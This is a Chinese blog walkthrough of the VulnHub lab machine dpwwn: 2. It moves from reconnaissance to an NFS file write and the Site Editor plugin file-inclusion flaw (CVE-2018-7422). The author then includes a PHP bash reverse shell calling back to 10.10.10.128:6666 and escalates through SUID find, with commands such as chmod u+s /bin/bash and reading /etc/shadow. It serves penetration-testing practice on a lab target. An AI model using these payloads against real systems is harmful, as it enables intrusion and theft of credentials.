---
title: dpwwn-2
author: Creexile
date: 2025-01-08 19:39:36
lastMod: 2025-01-08
summary: 'easyNo.9'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [NFS挂载, 文件包含, 提权, 渗透]
---

# dpwwn: 2

---

easyNo.9

> 来源: [vulnhub靶场-dpwwn: 2](https://www.vulnhub.com/entry/dpwwn-2,343/)
>
> 目标: Get the root shell and then obtain flag under /root
>
> 描述: Difficulty: Intermediate++ and fun.
>
> 妙妙工具: `python -c 'import pty; pty.spawn("/bin/bash")'`

## 环境配置

出现当前硬件版本不支持设备"sata", 启动失败; [不兼容设备解决办法](https://www.cnblogs.com/yaodun55/p/16434468.html)

靶机的ip固定为10.10.10.10, 你需要自己配置网络环境

- kali: 10.10.10.128
- target: 10.10.10.10

## 信息收集

nmap

```
nmap -sS 10.10.10.0/24
nmap -A 10.10.10.10

PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
2049/tcp open  nfs
```

访问网页

```
Welcome Mate : dpwwn-02 GOAL IS SIMPLE : OBTAIN: # shell like root@dpwwn-02:~#
```

目录扫描, 发现存在wordpress

```
dirsearch -u http://10.10.10.10

[04:32:48] 200 -    5KB - /wordpress/
[04:32:48] 200 -    1KB - /wordpress/wp-login.php
```

用wpscan扫扫看看有没有东西

```bash
# 有用户admin
wpscan --url http://10.10.10.10/wordpress -e u
# 尝试爆破, 但是跑了好久没跑出来, 于是放弃
wpscan --url http://10.10.10.10/wordpress -U admin -P /usr/share/wordlists/rockyou.txt
```

再来试试rpc和nfs, 发现没有东西, 也是失败了

```bash
# /home/dpwwn02 (everyone)
showmount -e 10.10.10.10
# 挂载了但是没东西啊
mkdir /tmp/dpwwn2
chmod 777 dpwwn2
mount -t nfs 10.10.10.10:/home/dpwwn02 /tmp/dpwwn2
# 取消挂载和强制取消
umount /tmp/dpwwn2
umount -f /tmp/dpwwn2
```

尝试往里面写文件, 发现可以写, 但是不知道那边是否可以被创建

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108190658.png)

那现在就只有一个80端口的wordpress可以整了, 没有其他东西了

结合之前尝试过的, 知道了用户admin, 但是爆破排除; 那就只能是插件有问题了

虽然详细扫描需要WPScan API Token, 但是知道有什么插件不需要, 扫描得到插件`site-editor`

```bash
wpscan --url http://10.10.10.10/wordpress
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108180425.png)

> 不喜欢搜索就用[这篇文章](https://blog.csdn.net/2201_75362610/article/details/135629192), 可以直接获取是什么漏洞
>
> 示例图: ![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108181028.png)

搜索可以找到[WordPress插件Site Editor本地文件包含漏洞](https://avd.aliyun.com/detail?id=AVD-2018-7422), 即CVE-2018-7422

> 百度搜索不如google一根, 高级搜索还没别人模糊搜索强, 别用百度

利用方法就是向`http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php`文件发送`ajax_path`参数读取任意文件

```
http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108185458.png)

有任意读取, 但是却没有其他信息让我们知道什么地方有什么东西; 想到前面的nfs挂载, 那我们就利用这个确认nfs的那一头是否会受影响(已经创建了1.txt)

```
http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/home/dpwwn02/1.txt
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108190715.png)

证明可以成功创建, 那么就可以反弹shell了

## getshell

新建一个php文件然后用vim编辑:

```php
<?php exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.10.128/6666 0>&1"');?>
```

然后开始监听对应端口, 尝试包含文件, 成功包含

```bash
# kali
nc -lvnp 6666
# url
http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/home/dpwwn02/shell.php
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108191622.png)

## 信息收集

现在我们要进行第二步, 拿到root下的flag

```bash
# 系统信息 Linux dpwwn-02 5.0.0-23-generic #24-Ubuntu SMP Mon Jul 29 15:36:44 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
uname -a
# 内核版本 5.0.0-23-generic, 太高了
uname -r
# 查看环境
python -h
nc -h
gcc -v
# 查看权限, 无
sudo -l
# 查看特权文件, find有权限
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
# 看看计划任务, 发现权限还是www-data
cat /etc/crontab
```

## 提权

find提权立刻结束, 然后找到`/root`目录下的flag文件

```
find . -exec /bin/sh -p \; -quit
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108192237.png)

## 附录

> 不要在根目录下执行`find .`会卡非常久, 找个小的吧

靶机为ubuntu系统, 是不允许使用nc的-e参数的, 所以不能直接利用find反弹shell:

```bash
# 如果可能的话
find . -exec nc -lvnp 6666 -e /bin/sh \';
# 原理为利用-exec参数执行命令(本身是root权限)
find . -exec cat /etc /etc/shadow \;
```

既然可以以root权限执行命令, 那就可以给`/bin/bash`赋权然后利用-p参数获取root

```bash
find . -exec chmod u+s /bin/bash \;
bash -p
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250108193458.png)

> 你问我为什么没有提权就是bash-5.0, 因为我之前在根目录执行了`find .`, 然后卡死了, 虽然执行完了但是得重新连接
